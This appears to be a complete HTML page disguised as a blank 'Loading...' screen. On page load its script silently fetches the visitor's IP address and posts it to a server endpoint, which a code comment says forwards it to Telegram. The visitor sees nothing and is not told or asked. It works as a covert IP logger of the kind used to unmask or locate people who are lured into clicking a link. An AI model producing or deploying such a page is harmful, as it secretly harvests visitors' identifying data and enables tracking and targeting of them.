<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script>
        fetch('/get-ip')
        .then(response => response.json())
        .then(data => {
            // Automatically send the IP to Telegram when the page loads
            fetch('/send-ip', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ip: data.ip })
            });
        });
    </script>
</head>
<body>
    <h3>Loading...</h3>
</body>
</html>
